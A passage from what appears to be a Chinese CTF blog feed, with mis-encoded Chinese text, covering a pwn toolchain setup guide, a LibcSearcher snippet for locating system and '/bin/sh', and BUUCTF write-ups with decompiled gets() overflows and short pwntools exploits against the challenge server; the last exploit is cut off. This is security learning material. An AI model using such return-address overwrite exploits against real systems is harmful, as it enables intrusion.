href="#pwntoolsé™„å¸¦çš„ä¸€äº›åŠŸèƒ½" class="headerlink" title="pwntoolsé™„å¸¦çš„ä¸€äº›åŠŸèƒ½"></a>pwntoolsé™„å¸¦çš„ä¸€äº›åŠŸèƒ½</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checksec æ£€æŸ¥ä¿æŠ¤</span><br><span class="line">ROPgadget  gadgetæŸ¥æ‰¾</span><br></pre></td></tr></table></figure><h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(&quot;å‡½æ•°å&quot;,å‡½æ•°çœŸå®åœ°å€)</span><br><span class="line"></span><br><span class="line">libcbase = å‡½æ•°çœŸå®åœ°å€ â€“ obj.dump(&quot;å‡½æ•°å&quot;)</span><br><span class="line">system_addr = libcbase + obj.dump(&quot;system&quot;)            #system åç§»</span><br><span class="line">bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh åç§»</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨</summary>
    
    
    
    <category term="æ‚çƒ©" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="åŸºç¡€" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="å·¥å…·ä½¿ç”¨" scheme="https://ixout.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>pwnç¯å¢ƒå‡†å¤‡</title>
    <link href="https://ixout.github.io/posts/6947/"/>
    <id>https://ixout.github.io/posts/6947/</id>
    <published>2023-03-22T02:29:06.000Z</published>
    <updated>2023-03-22T15:20:25.524Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åŸæœ¬ç”¨çš„è™šæ‹Ÿæœºä¸çŸ¥é“æ€ä¹ˆæŠ½é£äº†ï¼Œå¼„äº†åŠå¤©æ²¡å¼„å¥½ğŸ˜£ï¼Œå¹²è„†ä¸€ä¸åšäºŒä¸ä¼‘åˆ äº†é‡æ–°å®‰è£…(å·²ç»ä¸çŸ¥é“ç¬¬å¤šå°‘æ¬¡äº†),é¡ºä¾¿è®°å½•ä¸‹ç¯å¢ƒæ­å»ºè¿‡ç¨‹.å› ä¸ºç”¨æƒ¯äº†ubuntu20æ‰€ä»¥è¿™æ¬¡çš„ç‰ˆæœ¬æ˜¯20.04.04ã€‚</p><p><strong>å¿ƒæ€çˆ†ç‚¸</strong>ï¼Œé‡è£…å®Œåå‘ç°ä¹‹å‰çš„é—®é¢˜è¿˜æ˜¯å­˜åœ¨ï¼Œäºæ˜¯æˆ‘æ€€ç–‘æ˜¯é¢˜ç›®çš„é—®é¢˜ï¼Œå»googleæœé¢˜çš„wpï¼Œç»“æœå‘Šè¯‰æˆ‘å°±æ˜¯é¢˜ç›®æœ‰é—®é¢˜ï¼ŒğŸ¤¡ğŸ¤¡é¬¼çŸ¥é“ä¸ºä»€ä¹ˆè¿ç»­åšåˆ°çš„ä¸¤é¢˜éƒ½æ˜¯é¢˜ç›®æœ¬èº«æœ‰é—®é¢˜(åé¢åˆè¯•äº†ä¸‹æœ¬åœ°æ–‡ä»¶æ˜¯å¯ä»¥çš„ï¼Œä½†æˆ‘ç›´æ¥è¿œç¨‹è°ƒè¯•ï¼‰ã€‚</p><p><strong>ä¹Ÿå°±æ˜¯è¯´æˆ‘æŠŠè‡ªå·±ç”¨çš„å¥½å¥½çš„æ²¡æœ‰ä»»ä½•é—®é¢˜çš„è™šæ‹Ÿæœºåˆ äº†ï¼Œç„¶åèŠ±äº†å››äº”ä¸ªå°æ—¶å»é‡æ–°è£…ä¸€ä¸ªã€‚ã€‚ã€‚ã€‚ã€‚</strong></p><p><strong>åˆ°åº•è¿˜æ˜¯å¤ªæ€¥èºäº†ï¼Œæ²¡æœ‰å¤šè¯•å‡ é“é¢˜å°±è®¤å®šæ˜¯è™šæ‹Ÿæœºçš„é—®é¢˜ï¼Œè¿™æ¬¡å°±å½“æ˜¯åƒäº†ä¸ªå¤§äºï¼Œä»¥åé‡åˆ°ç±»ä¼¼æƒ…å†µï¼Œè¿˜æ˜¯è¦å†·é™ï¼Œå¤šå–è¯å†è¡ŒåŠ¨ã€‚</strong></p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="è®¾ç½®è¶…çº§ç”¨æˆ·"><a href="#è®¾ç½®è¶…çº§ç”¨æˆ·" class="headerlink" title="è®¾ç½®è¶…çº§ç”¨æˆ·"></a>è®¾ç½®è¶…çº§ç”¨æˆ·</h2><p><code>sudo passwd root</code></p><h2 id="å…ˆæ¢ä¸ªæº"><a href="#å…ˆæ¢ä¸ªæº" class="headerlink" title="å…ˆæ¢ä¸ªæº"></a>å…ˆæ¢ä¸ªæº</h2><p>å¤‡ä»½ä¸€ä¸‹æ—§çš„</p><p><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></p><p>ç¼–è¾‘</p><p><code>sudo gedit /etc/apt/sources.list</code></p><p>æˆ‘é€‰æ‹©é˜¿é‡Œçš„æº,æ„Ÿè§‰è¿˜è¿‡å¾—å»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># é˜¿é‡Œäº‘é•œåƒæº</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆè¸©äº†ä¸ªå¤§å‘</p><p>å¾—å…ˆç”¨<code>lsb_release -c</code>çœ‹çœ‹è‡ªå·±çš„ubuntuæ˜¯å“ªä¸ªç‰ˆæœ¬</p><p>æˆ‘çš„æ˜¯focalä¹‹å‰å´ç”¨çš„bionicçš„æº</p><p>å°±å‡ºç°äº†è£…ä»€ä¹ˆéƒ½å‡ºé”™çš„å†¥åœºé¢</p><h2 id="pipæ¢æº"><a href="#pipæ¢æº" class="headerlink" title="pipæ¢æº"></a>pipæ¢æº</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.pip/</span><br><span class="line">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…vim"><a href="#å®‰è£…vim" class="headerlink" title="å®‰è£…vim"></a>å®‰è£…vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…gcc"><a href="#å®‰è£…gcc" class="headerlink" title="å®‰è£…gcc"></a>å®‰è£…gcc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br><span class="line">gcc --version  </span><br></pre></td></tr></table></figure><h2 id="é…ç½®32ä½ç¯å¢ƒ"><a href="#é…ç½®32ä½ç¯å¢ƒ" class="headerlink" title="é…ç½®32ä½ç¯å¢ƒ"></a>é…ç½®32ä½ç¯å¢ƒ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…git"><a href="#å®‰è£…git" class="headerlink" title="å®‰è£…git"></a>å®‰è£…git</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…pwntools"><a href="#å®‰è£…pwntools" class="headerlink" title="å®‰è£…pwntools"></a>å®‰è£…pwntools</h2><p>ä¸¤ç§æ–¹æ³•</p><p>ç¬¬ä¸€ç§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo python3 -m pip install --upgrade pip</span><br><span class="line">sudo python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">sudo python setup.py install #è¿™ä¸€æ­¥æœ€å¥½æŒ‚é­”æ³•</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…capstone"><a href="#å®‰è£…capstone" class="headerlink" title="å®‰è£…capstone"></a>å®‰è£…capstone</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="pwndbgä¸pwngdb"><a href="#pwndbgä¸pwngdb" class="headerlink" title="pwndbgä¸pwngdb"></a>pwndbgä¸pwngdb</h2><p>pwngdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">åŠŸèƒ½</span><br><span class="line">libc : Print the base address of libc</span><br><span class="line">ld : Print the base address of ld</span><br><span class="line">codebase : Print the base of code segment</span><br><span class="line">heap : Print the base of heap</span><br><span class="line">got : Print the Global Offset Table infomation</span><br><span class="line">dyn : Print the Dynamic section infomation</span><br><span class="line">findcall : Find some function call</span><br><span class="line">bcall : Set the breakpoint at some function call</span><br><span class="line">tls : Print the thread local storage address</span><br><span class="line">at : Attach by process name</span><br><span class="line">findsyscall : Find the syscall</span><br><span class="line">fmtarg : Calculate the index of format string</span><br><span class="line">You need to stop on printf which has vulnerability.</span><br><span class="line">force : Calculate the nb in the house of force.</span><br><span class="line">heapinfo : Print some infomation of heap</span><br><span class="line">heapinfo (Address of arena)</span><br><span class="line">default is the arena of current thread</span><br><span class="line">If tcache is enable, it would show infomation of tcache entry</span><br><span class="line">heapinfoall : Print some infomation of heap (all threads)</span><br><span class="line">arenainfo : Print some infomation of all arena</span><br><span class="line">chunkinfo: Print the infomation of chunk</span><br><span class="line">chunkinfo (Address of victim)</span><br><span class="line">chunkptr : Print the infomation of chunk</span><br><span class="line">chunkptr (Address of user ptr)</span><br><span class="line">mergeinfo : Print the infomation of merge</span><br><span class="line">mergeinfo (Address of victim)</span><br><span class="line">printfastbin : Print some infomation of fastbin</span><br><span class="line">tracemalloc on : Trace the malloc and free and detect some error .</span><br><span class="line">You need to run the process first than tracemalloc on, it will record all of the malloc and free.</span><br><span class="line">You can set the DEBUG in pwngdb.py , than it will print all of the malloc and free infomation such as the screeshot.</span><br><span class="line">parseheap : Parse heap layout</span><br><span class="line">magic : Print useful variable and function in glibc</span><br><span class="line">fp : show FILE structure</span><br><span class="line">fp (Address of FILE)</span><br><span class="line">fpchain: show linked list of FILE</span><br><span class="line">orange : Test house of orange condition in the _IO_flush_lockp</span><br><span class="line">orange (Address of FILE)</span><br><span class="line">glibc version &lt;= 2.23</span><br></pre></td></tr></table></figure><p>pwndbg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh#å»ºè®®æŒ‚é­”æ³•</span><br></pre></td></tr></table></figure><p>è”åˆä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.gdbinit</span><br><span class="line">æ³¨é‡Šæ‰ç¬¬ä¸€è¡Œ ç„¶ååœ¨ç¬¬äºŒè¡Œå†™å…¥</span><br><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…seccomp-tools"><a href="#å®‰è£…seccomp-tools" class="headerlink" title="å®‰è£…seccomp-tools"></a>å®‰è£…seccomp-tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…one-gadget"><a href="#å®‰è£…one-gadget" class="headerlink" title="å®‰è£…one_gadget"></a>å®‰è£…one_gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…LibcSearcher"><a href="#å®‰è£…LibcSearcher" class="headerlink" title="å®‰è£…LibcSearcher"></a>å®‰è£…LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install LibcSearcher</span><br><span class="line">sudo pip3 install -U LibcSearcher</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…main-arena-offset"><a href="#å®‰è£…main-arena-offset" class="headerlink" title="å®‰è£…main_arena_offset"></a>å®‰è£…main_arena_offset</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dev2ero/py_main_arena_offset.git</span><br><span class="line">cd py_main_arena_offset</span><br><span class="line">sudo python3 setup.py develop</span><br></pre></td></tr></table></figure><p>ç”¨æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pymao import *</span><br><span class="line"></span><br><span class="line">libc = &quot;./libc.so.6&quot;</span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line">print(hex(main_arena_offset))</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…æœ¬åœ°è°ƒè¯•ä¸åŒç‰ˆæœ¬çš„libcç¯å¢ƒ"><a href="#å®‰è£…æœ¬åœ°è°ƒè¯•ä¸åŒç‰ˆæœ¬çš„libcç¯å¢ƒ" class="headerlink" title="å®‰è£…æœ¬åœ°è°ƒè¯•ä¸åŒç‰ˆæœ¬çš„libcç¯å¢ƒ"></a>å®‰è£…æœ¬åœ°è°ƒè¯•ä¸åŒç‰ˆæœ¬çš„libcç¯å¢ƒ</h2><p><strong>glibc-all-in-one</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line">python3 update_list</span><br><span class="line">cat list</span><br><span class="line"> ./download [libc-version]</span><br></pre></td></tr></table></figure><p><strong>patchelf</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>ç”¨æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]</span><br><span class="line">patchelf --set-interpreter [libc-ld-path] [elf]</span><br><span class="line">cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug</span><br><span class="line">gdb [elf]</span><br></pre></td></tr></table></figure><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>åªèƒ½è¯´åšpwnå°±æ˜¯è¦é‡åˆ°å„ç§å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜</p>]]></content>
    
    
    <summary type="html">é ï¼Œå¥½çƒ¦</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="ç¯å¢ƒæ­å»º" scheme="https://ixout.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>buuctfåˆ·é¢˜è®°å½•-1</title>
    <link href="https://ixout.github.io/posts/13868/"/>
    <id>https://ixout.github.io/posts/13868/</id>
    <published>2023-03-21T13:53:30.000Z</published>
    <updated>2023-03-27T06:40:57.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>é¢˜å¦‚å…¶å</p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>å…¥é—¨é¢˜ï¼Œé˜²æŠ¤å…¨å…³</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote() <span class="comment">#ä¸å›ºå®šå°±ä¸å†™äº†</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x40118a</span>)) <span class="comment">#å…¶å®éƒ½æ¯”è¾ƒå»ºè®®è·³è¿‡å¼€å¤´çš„å¼€è¾Ÿæ ˆå¸§æ“ä½œ,è¦ä¸ç„¶æ€»æ˜¯é‡åˆ°ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜â‘ </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>åƒçš„å¤§äºå°±åœ¨è¿™é“é¢˜,æˆ‘ç°åœ¨æ‰çŸ¥é“<strong>æœ‰äº›é¢˜ç›®è™½ç„¶æœ‰è¾“å‡ºä¿¡æ¯,ä½†è¿œç¨‹recv()æ˜¯æ”¶ä¸åˆ°ä¸œè¥¿ä¼šå¡ä½çš„</strong>,è€Œæˆ‘åååˆæœ‰ä¸ç®¡æœ‰ç”¨æ²¡ç”¨åªè¦æœ‰ä¿¡æ¯éƒ½recvä¸€ä¸‹çš„ä¹ æƒ¯.ç»“æœè‡ªç„¶æ˜¯å¡æ­».æˆ‘è¿˜ä»¥ä¸ºæ˜¯æˆ‘çš„è™šæ‹Ÿæœºå‡ºäº†é—®é¢˜,æ°å·§æˆ‘æ‹¿æ¥éªŒè¯çš„å¦ä¸€é¢˜ä¹Ÿæ˜¯è¿™æ ·,æ›´åŠ ç¡®ä¿¡äº†æ˜¯æˆ‘è™šæ‹Ÿæœºçš„é—®é¢˜,åœ¨å„ç§å°è¯•æ— æœå,ç›´æ¥é‡è£…äº†ä¸€ä¸ªè™šæ‹Ÿæœº,å…¶ä¸­æ‚²æƒ¨å¯è§pwnç¯å¢ƒå®‰è£…ä¸€ç¯‡.</p><details class="folding-tag" yellow><summary> â‘  </summary>              <div class='content'>              <p>åœ¨ä¸€äº›æ¯”è¾ƒæ–°çš„ç¯å¢ƒä¸‹,å¦‚æœè¦†ç›–è¿”å›åœ°å€çš„å¼€å¤´çš„æ“ä½œä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br></pre></td></tr></table></figure><p>ç¨‹åºå°±ä¼šå´©æºƒ</p><p>æ‰€ä»¥ä¸€èˆ¬å»ºè®®éƒ½ç›´æ¥è·³è¿‡è¿™ä¸¤å¥ä»£ç </p><p>(é™¤ä¸€äº›ç‰¹æ®Šæƒ…å†µå¤–,ä¾‹å¦‚è¯¥å‡½æ•°éœ€è¦rbpè¿›è¡Œç›¸å¯¹ç´¢å¼•)</p>              </div>            </details><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>å’Œä¸Šä¸€é¢˜åŸºæœ¬æ²¡æœ‰åŒºåˆ«</p><p>åªä¸è¿‡æœ€åä¸æ˜¯ç»™shellæƒé™è€Œæ˜¯ç›´æ¥cat flagç½¢äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span>+p64(<span class="number">0x40060d</span>))</span><br><span class="line">p.interactive() <span class="comment">#è™½ç„¶ä¸æ˜¯æ‹¿åˆ°shellä½†å›åˆ°shellæ¨¡å¼ä¹Ÿèƒ½ç›´æ¥è·å¾—è¾“å‡º</span></span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>ä¿æŠ¤åªå¼€äº†nx</p><p>idaæŸ¥çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ€è·¯</p><ol><li>ç›´æ¥æº¢å‡ºè¿”å›åœ°å€åˆ°cat /flagæŒ‡ä»¤å¤„</li><li>æº¢å‡ºä¿®æ”¹v2,è¿™ä¸ªæ¯”è¾ƒå€¼æ˜¯å­—é¢å€¼å¯ä»¥åœ¨.rodataä¸­æ‰¾åˆ°</li></ol><p><strong>exp1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28933</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>+p64(<span class="number">0x4006BE</span>)) <span class="comment">#ä¸€å¼€å§‹å¥½å‡ æ¬¡æ²¡æˆåŠŸ,ä»¥ä¸ºä¸è¡Œ,ç»“æœæ˜¯æˆ‘æ‰“åŒ…æˆp32äº†</span></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>exp2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">p=remote()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">44</span>+p32(<span class="number">0x41348000</span>))<span 